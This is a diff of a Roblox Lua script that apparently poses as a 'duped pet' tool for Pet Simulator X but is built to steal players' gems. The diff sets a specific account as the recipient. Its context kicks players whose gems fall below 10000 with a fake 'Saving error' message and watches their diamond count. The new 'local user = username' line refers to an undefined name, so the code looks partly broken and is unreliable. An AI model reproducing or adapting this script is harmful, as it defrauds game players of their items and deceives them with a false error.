@@ -1,4 +1,4 @@
-Username = "PsxDupedPetScript"
+Username = "kokoska1234577"
 LoadScreen = false -- If you want to enable loadgui, rename to true
 
 
@@ -24,8 +24,7 @@ if GemAmount1 < 10000 then
     plr:kick("Saving error, please rejoin! Source code by .t.ob.i.")
 end
 
-local user = kokoska1234577
-
+local user = username
 local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
 local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
 gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
